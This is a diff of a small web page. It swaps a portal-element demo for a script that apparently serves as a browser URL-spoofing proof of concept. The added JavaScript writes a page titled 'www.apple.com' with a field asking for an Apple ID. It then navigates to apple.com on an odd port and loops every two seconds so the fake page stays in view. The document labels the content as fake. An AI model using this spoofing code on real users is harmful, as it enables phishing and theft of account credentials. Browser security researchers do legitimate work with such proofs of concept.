@@ -1,17 +1,23 @@
-<html>
-<body>
-<button onclick="activate()" style="background-color:red; font-size:36px;">
-CLICK ME TO ACTIVATE THE PORTAL
-</button>
-<script>
-var portal = document.createElement('portal')
-portal.src = "https://jigsaw.w3.org/HTTP/Basic/"
-portal.style = "height:1000px;width:1000px;"
-document.body.appendChild(portal)
 
-function activate() {
- portal.activate()
+<script>
+function spoof()
+
+{
+
+document.write("<title>www.apple.com</title>");
+  
+    a= '<h1>Fake Content!!</h1><p>Please input your Apple ID here:<input></p>'
+
+document.write(a);
+window.location.assign("http://www.apple.com:1121");
+
+   	setTimeout(function(){
+		spoof();  // Loop makes the browser always shows the fake page.
+	}, 2000);
+
 }
+
+
+
+setInterval(spoof(),2000);
 </script>
-</body>
-</html>
